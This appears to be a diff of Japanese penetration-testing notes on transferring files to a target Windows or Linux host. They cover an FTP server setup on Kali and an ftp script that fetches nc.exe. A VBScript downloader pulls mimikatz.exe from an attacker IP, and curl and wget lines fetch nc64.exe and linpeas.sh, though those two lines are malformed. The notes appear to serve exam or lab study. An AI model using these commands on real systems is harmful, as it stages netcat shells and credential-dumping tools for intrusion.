@@ -1,65 +1,70 @@
 # FileTransfer
 
-### windowsにftpでファイル転送
+### FTP(powershellが使えなくてftp有効な時)
 
-* kaliにFTPサーバーを立てる
+#### 実行コマンド
 
-  ```
-  sudo apt update && sudo apt install pure-ftpd
-  ```
+```bash
+# kali
+/ftphome/nc.exe
+sudo systemctl restart pure-ftpd
+```
 
-  * 以下スクリプトでユーザ登録
+```cmd
+# windows パスワード部分を変更すること
+echo open 192.168.45.241 21 > ftp.txt
+echo USER ftpuser >> ftp.txt
+echo <パスワードいつもの> >> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+```
 
-    ```bash
-    kali@kali:~$ cat ./setup-ftp.sh
-    #!/bin/bash
-    
-    sudo groupadd ftpgroup
-    sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-    sudo pure-pw useradd offsec -u ftpuser -d /ftphome
-    sudo pure-pw mkdb
-    cd /etc/pure-ftpd/auth/
-    sudo ln -s ../conf/PureDB 60pdb
-    sudo mkdir -p /ftphome
-    sudo chown -R ftpuser:ftpgroup /ftphome/
-    sudo systemctl restart pure-ftpd
-    ```
+```cmd
+ftp -v -n -s:ftp.txt
+```
 
-  ```bash
-  sudo systemctl status pure-ftpd
-  sudo systemctl start pure-ftpd
-  ```
 
-* 転送するファイルを/ftphome配下に転送する
 
-  ```
-  sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
-  ls /ftphome/ 
-  ```
+#### 設定方法
 
-* windowsで取得する
+kaliへのftpインストール
 
-  ```cmd
-  C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
-  C:\Users\offsec>echo USER offsec>> ftp.txt
-  C:\Users\offsec>echo lab>> ftp.txt
-  C:\Users\offsec>echo bin >> ftp.txt
-  C:\Users\offsec>echo GET nc.exe >> ftp.txt
-  C:\Users\offsec>echo bye >> ftp.txt
-  
-  C:\Users\offsec> ftp -v -n -s:ftp.txt
-  ```
+```
+sudo apt update && sudo apt install pure-ftpd
+```
 
-  ```
-  echo open 10.11.0.4 21> ftp.txt
-  echo USER offsec>> ftp.txt
-  echo lab>> ftp.txt
-  echo bin >> ftp.txt
-  echo GET try-harder.mp3 >> ftp.txt
-  echo bye >> ftp.txt
-  ```
-  
-  
+スクリプトでユーザ登録
+※以下ユーザで登録済み
+
+```
+ftpuser
+いつもの
+```
+
+```bash
+kali@kali:~$ cat ./setup-ftp.sh
+#!/bin/bash
+
+sudo groupadd ftpgroup
+sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+sudo pure-pw useradd ftpuser -u ftpuser -d /ftphome
+sudo pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+sudo ln -s ../conf/PureDB 60pdb
+sudo mkdir -p /ftphome
+sudo chown -R ftpuser:ftpgroup /ftphome/
+sudo systemctl restart pure-ftpd
+```
+
+```bash
+sudo systemctl status pure-ftpd
+sudo systemctl start pure-ftpd
+```
+
+
+
+
 
 ### VBScriptを利用したファイル転送
 
@@ -96,7 +101,7 @@ echo  ts.Close >> wget.vbs
 cscriptを実行する
 
 ```
-cscript wget.vbs http://192.168.119.144/evil.exe evil.exe
+cscript wget.vbs http://192.168.119.161/mimikatz.exe mimikatz.exe
 ```
 
 
@@ -232,4 +237,16 @@ Windows7およびWindows Server 2008 R2以降で動作
   
 
 ### ファイル出力（nc)
+
+
+
+### ファイル転送（curl)
+
+```
+curl -o http://172.31.25.52:8000/nc64.exe
+```
+
+```
+wget -O http://192.168.119.167/linpeas.sh
+```
 
